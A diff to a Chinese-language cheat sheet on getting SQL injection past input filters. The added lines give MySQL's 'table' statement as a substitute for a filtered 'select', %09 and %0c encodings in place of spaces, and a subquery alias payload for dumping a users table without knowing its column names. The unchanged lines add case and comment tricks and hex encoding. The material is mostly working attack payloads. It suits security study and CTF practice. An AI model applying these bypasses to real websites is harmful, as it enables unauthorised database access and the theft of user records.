@@ -1,5 +1,12 @@
 ## **大写绕过**
 select被过滤，试试Select
+```
+mysql 8.0.19新增语句table
+
+table table_name
+
+过滤select可以使用table代替
+```
 
 ^
 ## **编码绕过**
@@ -11,6 +18,13 @@ is_numeric($_GET['id']) ，过滤只允许数字，16进制编码sql注入。
 ```
 有的时候是union select被过滤，union/**/select也可以绕过
 ```
+编码绕过
+```
+%09
+%0c
+```
+
+
 利用括号，括号住变量。
 ```
 所有库
@@ -47,6 +61,7 @@ select group_concat(table_name）from mysql.innodb_table_stats where database_na
 select 1,2 union select * from user;
 
 select `2` from  (select 1,2 union select * from user) as u
+select u.2 from (select 1,2 union select * from users) as u
 
 整合
 select group_concat(`2`) from  (select 1,2 union select * from user) as u 
